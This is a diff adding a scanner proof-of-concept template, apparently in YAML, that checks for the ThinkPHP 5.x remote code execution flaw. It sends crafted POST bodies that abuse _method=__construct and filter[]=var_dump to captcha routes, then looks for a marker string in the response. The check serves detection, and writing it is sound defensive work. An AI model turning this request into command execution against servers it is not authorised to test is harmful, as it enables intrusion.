@@ -1,0 +1,26 @@
+id: poc-yaml-thinkphp-5x-rce
+info:
+  name: ThinkPHP 5.x 远程命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  - 两高一弱
+  finger: ThinkPHP
+  osprey-id: vb_2019_0002
+variables:
+  r_path: '/index.php?s=captcha
+
+    /public/index.php?s=captcha'
+  r_datas: '_method=__construct&method=get&filter[]=var_dump&get[]=this_is_a_testa
+
+    _method=__construct&method=get&filter[]=var_dump&server[REQUEST_METHOD]=this_is_a_testa'
+requests:
+- method: POST
+  path: '{{.r_path}}'
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  expression: 'contains(body, "string(15) \"this_is_a_testa")
+
+    '
+  data: '{{.r_datas}}'
+transport: http
